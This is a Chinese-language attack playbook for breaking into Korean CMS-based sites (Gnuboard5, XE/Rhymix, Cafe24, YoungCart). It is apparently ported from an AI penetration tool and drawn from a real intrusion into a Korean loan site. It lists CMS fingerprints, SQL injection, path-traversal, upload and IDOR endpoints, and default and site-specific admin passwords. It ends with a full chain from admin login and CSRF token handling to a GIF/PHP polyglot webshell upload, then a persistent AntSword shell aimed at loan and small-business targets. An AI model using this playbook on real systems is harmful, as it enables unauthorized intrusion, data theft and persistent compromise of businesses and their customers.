# Korean CMS Arsenal — 从 bingo v7.0.66 移植 (gnuboard.py + korean_cms.py + admin_panel_auto.py)

来源: bingo AI 渗透终端 (实战: 韩国贷款站 Gnuboard5 完整渗透链)
价值: 韩国金融/贷款/电商站的标准化打法

## 1. 韩国 CMS 指纹
```
gnuboard5: gnuboard5, 그누보드, /bbs/board.php, g5_, /theme/, skin/board/, /adm/
xe:        XpressEngine, XE, xe_, /index.php?mid=, xe/index.php, /files/attach/, xe_session
rhymix:    Rhymix, rhymix, rx_, /common/js/rhymix
cafe24:    cafe24, ECSHOP, ec-, /shop/, order_id, member_id, cafe24.com
youngcart: 영카트, youngcart, ycart, yc_, /shop/item.php, /shop/cart.php
wordpress: WordPress, wp-content, wp-login.php, wp-admin, wp-includes (韩插件特化)
```

## 2. GnuBoard5 漏洞点
```
admin_paths: /adm/ /adm/index.php /adm/board_list.php /adm/member_list.php /bbs/adm/ /admin/
SQLi:  /bbs/board.php?bo_table=  /bbs/view.php?bo_table=  /bbs/view.php?wr_id=
       /bbs/member_confirm.php POST mb_id=  /bbs/login_check.php POST mb_id=
LFI:   /bbs/board.php?skin=../../etc/passwd  /bbs/board.php?bo_skin_path=../../etc/passwd  ← 独有
上传:  /bbs/write_update.php POST bf_file_1  /adm/board_list_update.php POST thumbnail
敏感:  /config.php /common/config.php /gnu/config.php /.env /phpinfo.php /bbs/setup.php
```

## 3. XE/Rhymix 漏洞点
```
admin: /index.php?module=admin /index.php?act=dispAdminIndex /files/config/
SQLi:  /index.php?mid=board&document_srl=  /index.php?act=dispBoardContent&document_srl=
上传:  /index.php?act=procFileUpload POST user_file  /index.php?act=procEditorUpload POST editor_file
RCE:   /install/ /xe/install/ /update/
```

## 4. Cafe24 电商 IDOR
```
IDOR: /shop/mypage.php?order_id=  /shop/mypage/order_detail.php?order_id=
      /member/memberinfo.php?member_id=  /myshop/order_list.php?order_id=
admin: /admin/shop1/ /dipadmin/ /manager/
API:   /api/v2/products /api/v2/orders /api/v2/customers
判定:  body 含 이 name email 주소 address 결제 即订单页命中
```

## 5. YoungCart 漏洞点
```
SQLi: /shop/item.php?it_id=  /shop/list.php?ca_id=  /shop/cart.php POST it_id
IDOR: /mypage/order_view.php?od_id=  /mypage/member_info.php?mb_id=
admin: /adm/ /adm/shop_list.php /adm/member_list.php
```

## 6. Gnuboard5 完整攻击链
```
1. 指纹: /bbs/board.php 等标记 → cms=gnuboard5, 找 admin_path (/adm/)
2. 敏感检查: OTP/auth_key 泄露 (auth_key=16+hex / otp=4-8位数字)
3. 管理员登录: /adm/login_check.php POST mb_id+mb_password
   成功判定: cookie g5_is_admin == 'super' (最可靠)
4. CSRF 双 token:
   会话级: admin.js 中 g5_admin_csrf_token_key (32位hex, 登录后固定)
   请求级: POST /adm/ajax.token.php {admin_csrf_token_key} → 一次性 token
5. 上传 GIF polyglot webshell (21字节有效GIF + PHP)
6. webshell 验证: POST shell_url {ant: "echo 'BINGO_SHELL_OK';"}
7. 用旧 shell 写 clean shell (file_put_contents + base64_decode)，AntSword 直连
```

### 上传端点优先级 (经验)
```
/adm/design_set.php → /adm/design_set_update.php  字段: logo_set[homepage_logo]
/adm/config_form.php → /adm/config_form_update.php  字段: cf_logo
/adm/board_form.php → /adm/board_form_update.php  字段: bo_list_icon
```

## 7. bo_table 自动发现 (防误报关键)
```
NOT_FOUND 模式 (命中=表不存在，别测):
"존재하지 않는 게시판", "게시판이 없습니다", "등록된 게시판이 아닙니다",
"board does not exist", "invalid board"
常见 bo_table: free notice faq qa gallery data board news event review qna pds blog
photo movie community introduce info help support main sub loan counsel apply
consult service intro about company product
```

## 8. 韩国管理员凭据
```
admin/admin admin/password admin/123456 admin/admin123 administrator/admin
admin/"" root/root admin/1234 + dndnloan系列 (贷款平台): dndnloan dndnloan123 loan123
```

## 9. 登录成功三重判定 (通用)
```
① success 关键词: dashboard logout welcome 관리자 관리 "admin panel" 사용자 목록 회원 관리
   게시판 관리 환경설정 Users Members Configuration Settings "Sign out"
② fail 关键词优先覆盖: invalid incorrect wrong failed error 존재하지 일치하지 로그인 실패
   비밀번호가 아이디가
③ 302/301 重定向且无 fail 词 → 成功 (登录后 302 到 dashboard)
```

## 10. 实战经验
- Gnuboard5 遍布韩国贷款中介/小企业站 — 对 OK Encash 类目标直接可用
- logo 上传端点通常"图片验证但允许 append PHP" — 第一优先
- 表单 hidden 字段全量收集再回填 (不止 CSRF token)
- 登录 cookie 必须复用同一 Session
